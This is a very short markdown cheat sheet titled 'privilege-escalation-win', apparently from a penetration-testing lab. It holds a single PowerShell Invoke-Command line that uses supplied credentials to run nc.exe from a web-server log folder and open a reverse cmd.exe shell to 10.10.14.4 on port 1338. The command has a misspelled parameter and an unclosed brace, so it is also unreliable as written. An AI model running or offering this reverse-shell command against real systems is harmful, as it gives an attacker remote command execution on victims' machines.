# privilege-escalation-win

## powershell

```text
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe
```

